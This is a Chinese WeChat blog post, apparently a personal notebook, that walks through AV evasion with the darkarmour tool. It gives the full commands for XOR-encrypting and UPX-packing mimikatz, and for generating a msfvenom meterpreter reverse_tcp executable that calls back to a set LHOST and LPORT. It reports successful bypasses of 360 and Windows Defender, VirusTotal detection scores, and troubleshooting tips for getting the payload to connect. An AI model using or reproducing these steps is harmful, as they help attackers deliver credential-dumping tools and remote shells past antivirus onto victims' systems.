#  我的免杀之路：利用darkarmour实现mimikatz和MSF的免杀

Snaker  [ Snaker独行者 ](javascript:void\(0\);)

**Snaker独行者** ![]()

微信号 gh_e5407d383892

功能介绍 记录本人网络安全知识/经验/笔记，致敬未来的我。

____

__

收录于话题 #免杀对抗 5个内容

  

![](https://gitee.com/fuli009/images/raw/master/public/20210916194459.png)

  

  

  

**0x1  mimikatz免杀**

 **  
**

  * 

    
    
    python3 darkarmour.py -f /root/mimikatz.exe -e xor -j -k sanker -l 20 -u -o /root/bypass_mimikatz.exe

  

k参数：用于加密的密钥key，如果不设置则默认随机生成  
j参数：使用基于jmp的PE加载器  
l参数：加密级别  
u参数：用upx打包可执行文件

  

![](https://gitee.com/fuli009/images/raw/master/public/20210916194504.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210916194505.png)

  

这里加密字节的过程比较久，尝试运行bypass_mimikatz.exe

  

![](https://gitee.com/fuli009/images/raw/master/public/20210916194507.png)

  

运行成功，看看免杀效果如何  

  

Bypass 360 success!

![](https://gitee.com/fuli009/images/raw/master/public/20210916194508.png)

  

Bypass Windows Defender success!

![](https://gitee.com/fuli009/images/raw/master/public/20210916194509.png)

  

V站评分10/66

![](https://gitee.com/fuli009/images/raw/master/public/20210916194511.png)

  

  

  

  

 **0x2  MSF免杀**

 **  
**

先生成可执行文件

  * 

    
    
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.160.128 LPORT=4488 -f exe -o msf.exe

  

![](https://gitee.com/fuli009/images/raw/master/public/20210916194512.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210916194513.png)

  

此次的加密等级设置为10，看运行如何

  

![](https://gitee.com/fuli009/images/raw/master/public/20210916194514.png)

  

上线成功，看看免杀效果如何

  

Bypass 360 success!

![](https://gitee.com/fuli009/images/raw/master/public/20210916194516.png)

  

Bypass Windows Defender success!

![](https://gitee.com/fuli009/images/raw/master/public/20210916194517.png)

  

V站评分22/66（分数不太可观，可能和我设置的加密等级有关）

![](https://gitee.com/fuli009/images/raw/master/public/20210916194518.png)

  

  

* * *

  

吐槽一下，加密后的mimikatz.exe居然10.6MB，我真服了。源文件才1.29MB，我猜测这应该是我设置的加密等级太高，图中可以看到我加密等级为500，项目给出的示例也仅仅是5而已。同时，我猜测加密等级会影响免杀效果，由于加密花费时间较长，我这里就没有一一进行测试，师傅们可以自行尝试。

  

![](https://gitee.com/fuli009/images/raw/master/public/20210916194519.png)

  

  

  

* * *

  

  

 **记录一些使用过程中遇到的问题：**  

  

 **排坑1：报错“sh: 1: x86_64-w64-mingw32-gcc: not foundded.exe...”**

![](https://gitee.com/fuli009/images/raw/master/public/20210916194520.png)

 **解决方法：**  

  * 

    
    
     apt-get install mingw-w64

 **项目所需要的依赖环境：**  

  * 

    
    
     apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode

注意：本人试过用Windows
10和Ubuntu系统去使用darkarmour工具，都混淆shellcode失败，原因未知。如果同样有小伙伴在使用这款工具时遇到这样的问题，不妨换成Kali系统。

  

  

 **排坑2：使用msfvenom生成MSF马时，必须用以下命令**

  * 

    
    
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.160.128 LPORT=4488 -f exe -o msf.exe

注意：payload一定得是windows/x64/meterpreter/reverse_tcp  
（别问为什么，我也不清楚，我一开始上线不成功，最后排查到居然是payload的问题，想不明白为什么，这里浪费好些时间![](https://gitee.com/fuli009/images/raw/master/public/20210916194521.png)）

  

  

 **源项目地址：**

  * 

    
    
     https://github.com/bats3c/darkarmour

感谢所有前辈的开源精神以及知识分享![](https://gitee.com/fuli009/images/raw/master/public/20210916194522.png)

  

  

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

我的免杀之路：利用darkarmour实现mimikatz和MSF的免杀

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

